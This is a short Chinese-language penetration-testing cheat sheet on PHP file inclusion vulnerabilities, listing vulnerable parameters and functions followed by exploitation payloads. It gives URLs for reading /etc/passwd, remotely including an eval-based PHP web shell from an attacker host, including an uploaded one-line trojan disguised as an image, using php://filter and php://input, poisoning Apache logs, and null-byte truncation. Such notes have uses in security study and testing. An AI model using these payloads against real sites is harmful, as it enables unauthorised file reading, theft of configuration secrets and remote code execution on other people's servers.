---
# 这是页面的图标
icon: script
# 这是文章的标题
title: 文件包含
# 设置作者
author: lhz
# 设置写作时间
time: 2021-08-20
# 一个页面只能有一个分类
category: 渗透
# 一个页面可以有多个标签
tag:
  - 渗透
  - 文件包含
comment: false
---

## 典型特征
```URL
?page=a.php
?home=b.html
?file=content
?name=a.php
```
## php常见导致文件包含的函数：
```php
include()
include_once()
require()
require_once()
fopen()
readfile()
```
## 利用
1. 读取文件
```url
http://www.xxser.com/index.php?page=/etc/passwd
```
2. 远程包含shell
allow_url_fopen=on 情况下
```url
http://www.example.com/index.php?page=http://www.attacker.com/echo.txt
其中echo.txt内容为:<?php eval($_POST[xxser]);?>
```
3. 本地包含配合文件上传漏洞包含shell
```url
上传一句话木马文件后，通过文件包含利用，非php扩展文件被包含后也会被当作php解析
http://www.example.com/index.php?page=./uploadfile/xxx.jpg
```
4. PHP协议
  - php://filter  
  一种元封装器，用于数据流打开时的筛选过滤应用
  ```url
  http://www.example.com/index.php?page=php://filter/read=convert.base64-encode/resource=config.php
  ```
  - php://input  
  php://input是个可以访问请求的原始数据的只读流,可以接收post请求，将请求作为PHP代码的输入传递给目标变量
  ```url
  http://www.example.com/index.php?page=php://input
  ```
5. 包含日志文件
```url
先访问：http://www.example.com/<?php phpinfo();?>生成日志
再访问：http://www.xxser.com/index.php?page=./../Apache-20/logs/access.log
关键在于确定apache路径
```
6. 截断包含  
magic_quotes_gpc=off 情况下
```url
http://www.example.com/index.php?page=1.jpg%00
```
